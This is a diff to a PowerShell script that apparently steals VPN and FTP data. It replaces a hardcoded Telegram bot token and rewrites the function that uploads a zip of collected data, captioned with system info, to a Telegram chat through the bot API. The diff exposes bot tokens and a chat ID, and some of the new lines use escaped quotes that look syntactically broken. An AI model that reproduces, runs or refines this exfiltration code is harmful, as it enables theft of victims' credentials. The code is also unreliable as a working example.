@@ -17,7 +17,7 @@ $messages = @{
 }
 
 # --- Параметры Telegram ---
-$BotToken = "8432230669:AAGsKeVpDl9nKqUuHUfciRxrGYdIGQ01b6I"
+$BotToken = "8392193092:AAFeBWyOvc9FynF-wLYTdqHqSJBu5X-QRkQ"
 $ChatID = "1266539824"
 
 function WriteMsg($key) {
@@ -240,18 +240,48 @@ function Get-VpnFtpData {
 }
 
 function Send-ResultToTelegram {
-    param ([string]$BotToken, [string]$ChatID, [string]$ZipPath, [string]$SystemInfoPath)
+    param (
+        [string]$BotToken,
+        [string]$ChatID,
+        [string]$ZipPath,
+        [string]$SystemInfoPath
+    )
     $caption = Get-Content $SystemInfoPath | Out-String
-    $uri = "https://api.telegram.org/bot$BotToken/sendDocument"
+    $url = "https://api.telegram.org/bot$BotToken/sendDocument"
     try {
-        $resp = Invoke-RestMethod -Method Post -Uri $uri -ContentType "multipart/form-data" -Form @{
+        $form = @{
             chat_id = $ChatID
-            document = Get-Item -Path $ZipPath
             caption = $caption
         }
-        if ($resp.ok -eq $true) { return $true }
-        else { return $false }
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $LF = "`r`n"
+        $bodyLines = @()
+        foreach ($k in $form.Keys) {
+            $bodyLines += "--$boundary$LF"
+            $bodyLines += "Content-Disposition: form-data; name=`"$k`"$LF$LF$form[$k]$LF"
+        }
+        $fileName = [System.IO.Path]::GetFileName($ZipPath)
+        $fileBytes = [System.IO.File]::ReadAllBytes($ZipPath)
+        $bodyLines += "--$boundary$LF"
+        $bodyLines += "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"$LF"
+        $bodyLines += "Content-Type: application/zip$LF$LF"
+        $bodyStream = [System.IO.MemoryStream]::new()
+        $writer = [System.IO.StreamWriter]::new($bodyStream)
+        foreach ($line in $bodyLines) { $writer.Write($line) }
+        $writer.Flush()
+        $bodyStream.Write($fileBytes,0,$fileBytes.Length)
+        $writer2 = [System.IO.StreamWriter]::new($bodyStream)
+        $writer2.Write(\"$LF--$boundary--$LF\")
+        $writer2.Flush()
+        $bodyStream.Position = 0
+
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add(\"Content-Type\", \"multipart/form-data; boundary=$boundary\")
+        $response = $wc.UploadData($url, $bodyStream.ToArray())
+        $result = [System.Text.Encoding]::UTF8.GetString($response)
+        if ($result -like '*\"ok\":true*') { return $true } else { return $false }
     } catch { return $false }
 }
+
 
 Start-Execution
